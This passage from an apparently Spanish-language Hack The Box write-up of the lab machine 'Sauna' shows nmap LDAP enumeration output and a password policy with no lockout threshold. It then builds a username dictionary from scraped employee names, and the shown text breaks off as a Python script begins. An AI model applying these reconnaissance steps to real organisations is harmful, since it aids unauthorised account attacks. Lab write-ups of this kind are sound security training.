class=&#34;se&#34;&gt;\x&lt;/span&gt;C6%&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;ECD&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;B2&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;B9&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;9F&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;F8&lt;span class=&#34;se&#34;&gt;\D\x&lt;/span&gt;B2&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;EC
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         uSNChanged: &lt;span class=&#34;m&#34;&gt;53269&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         name: EGOTISTICAL-BANK
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectGUID: 504e6ec-c122-a143-93c0-cf487f83363
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         replUpToDateVector: &lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;02&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;02&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;FDZ&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;85&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;92F&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;DE^A&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;AAVnj@#&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;F6&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;0C&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;0B&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;D0&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;FE&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;C0e&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;14&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;03&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00@&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;BE&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;E0&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;B3&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;C6%&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;ECD&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;B2&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;B9&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;9F&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;F8&lt;span class=&#34;se&#34;&gt;\D\x&lt;/span&gt;B2&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;EC	&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;B0&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;D4&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;04R&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;14&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;03&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         creationTime: &lt;span class=&#34;m&#34;&gt;132271147519409907&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         forceLogoff: -9223372036854775808
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         lockoutDuration: -18000000000
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         lockOutObservationWindow: -18000000000
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         lockoutThreshold: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         maxPwdAge: -36288000000000
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         minPwdAge: -864000000000
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         minPwdLength: &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         modifiedCountAtLastProm: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         nextRid: &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         pwdProperties: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         pwdHistoryLength: &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectSid: 1-5-21-2966785786-3096785034-1186376766
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         serverState: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         uASCompat: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         modifiedCount: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         auditingPolicy: &lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;01&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         nTMixedDomain: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         rIDManagerReference: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;RID Manager$,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;System,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         fSMORoleOwner: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;NTDS Settings,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;SAUNA,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Servers,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Default-First-Site-Name,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Sites,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         systemFlags: -1946157056
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;NTDS Quotas,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Microsoft,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Program Data,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Program Data,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ForeignSecurityPrincipals,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Deleted Objects,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Infrastructure,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LostAndFound,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;System,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Domain Controllers,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Computers,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Users,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectCategory: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Domain-DNS,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Schema,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         isCriticalSystemObject: TRUE
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         gPLink: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;LDAP://CN&lt;span class=&#34;o&#34;&gt;={&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Policies,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;System,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         dSCorePropagationData: 1601/01/01 00:00:00 UTC
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Keys,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Managed Service Accounts,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         masteredBy: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;NTDS Settings,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;SAUNA,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Servers,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Default-First-Site-Name,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Sites,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         ms-DS-MachineAccountQuota: &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         msDS-Behavior-Version: &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         msDS-PerUserTrustQuota: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         msDS-AllUsersTrustQuota: &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         msDS-PerUserTrustTombstonesQuota: &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         msDs-masteredBy: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;NTDS Settings,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;SAUNA,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Servers,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Default-First-Site-Name,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Sites,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         msDS-IsDomainFor: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;NTDS Settings,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;SAUNA,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Servers,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Default-First-Site-Name,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Sites,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         msDS-NcType: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         dc: EGOTISTICAL-BANK
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Users,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Computers,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;OU&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Domain Controllers,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;System,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LostAndFound,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Infrastructure,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ForeignSecurityPrincipals,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Program Data,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;NTDS Quotas,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Managed Service Accounts,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Keys,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;TPM Devices,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Builtin,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    dn: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Hugo Smith,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL

&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Feb 25 00:41:13 2020 -- 1 IP address (1 host up) scanned in 1.03 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;user---fsmith&#34;&gt;USER - FSmith&lt;/h1&gt;
&lt;p&gt;En el puerto 80 esta corriendo una pagina en la cual podemos obtener los nombres de las personas que pertenecen a esta empresa, utilizando estos nombres creamos un diccionario con diferentes conbinaciones entre si, en el reporte de nmap con el script de ldap-search podemos ver otro nombre &amp;lsquo;Hugo Smith&amp;rsquo; el cual vamos a agregar a nuestro diccionario de nombres.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://wiki.owasp.org/index.php/Testing_for_Weak_password_policy_(OTG-AUTHN-007)&#34;&gt;&lt;strong&gt;Testing for Weak password policy&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Nombres&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sauna/Screenshot_20200226_153123.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Combinacion de nombres de usuarios con script de python:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sauna/Screenshot_20200226_153207.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python:names.py&#34; data-lang=&#34;python:names.py&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;sys&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
